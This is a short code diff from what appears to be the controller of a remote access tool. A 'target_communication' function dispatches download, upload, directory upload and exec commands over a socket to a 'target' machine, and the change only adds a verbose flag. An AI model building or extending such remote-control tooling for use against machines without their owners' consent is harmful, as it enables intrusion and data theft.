@@ -30,12 +30,12 @@ def target_communication(s: socket.socket, ip: str, verbose=False):
             pass
         # (download|upload) [source] [target]
         elif func == "download":
-            cmd.download_file(s, args)
+            cmd.download_file(s, args, verbose)
         elif func == "upload":
-            cmd.upload_file(s, args)
+            cmd.upload_file(s, args, verbose)
         # upload_dir [source_dir] [target_dir]
         elif func == "upload_dir":
-            cmd.upload_dir(args, command_buffers)
+            cmd.upload_dir(args, command_buffers, verbose)
         # exec [func] [...args]
         elif func == "exec":
             cmd.recv_exec_command(s)
